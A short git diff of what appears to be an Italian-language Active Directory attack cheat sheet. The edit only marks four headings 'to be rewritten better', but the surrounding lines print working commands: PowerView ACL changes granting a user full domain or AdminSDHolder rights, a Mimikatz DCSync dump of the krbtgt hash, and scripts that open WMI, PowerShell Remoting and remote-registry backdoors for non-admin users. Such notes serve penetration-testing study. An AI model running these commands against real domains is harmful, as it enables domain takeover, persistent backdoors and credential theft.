@@ -521,7 +521,7 @@ Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder, CN=System' -PrincipalSamAccoun
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'claudionepc'}
 ```
 
-## ACL: Full-control rights
+## ACL: Full-control rights (DA SCRIVERE MEGLIO!!!)
 
 ```
 Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName <username> -Rights All -Verbose
@@ -536,7 +536,7 @@ Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’
 
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 ```
-## ACL: Security Descriptors
+## ACL: Security Descriptors (DA SCRIVERE MEGLIO!!!)
 ### è possibile modificare i security descriptors (info clome Owner, primary group, DACL e SACL) di molteplifi  metodi di accesso remoto (oggetti proteggibili) per consentire l'accesso agli utenti non amministratori. Servono privilegi amministratori
 ### https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/security-descriptors
 
@@ -553,7 +553,7 @@ Set-RemoteWMI -Username <username> -Computername <computername> -Credential Admi
 Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Remove -Verbose (On remote machine remove permissions)
 ```
 
-### SecurityDescriptor - PowerShell Remoting
+### SecurityDescriptor - PowerShell Remoting (DA SCRIVERE MEGLIO!!!)
 ```
 . ./Set-RemotePSRemoting.ps1
 
@@ -564,7 +564,7 @@ Set-RemotePSRemoting -Username <username> -Computername <computername> -Verbose 
 Set-RemotePSRemoting -Username <username> -Computername <computername> -Remove (On a remote machine remove permissions)
 ```
 
-### SecurityDescriptor - Remote Registry
+### SecurityDescriptor - Remote Registry (DA SCRIVERE MEGLIO!!!)
 ```
 . ./Add-RemoteRegBackdoor
 
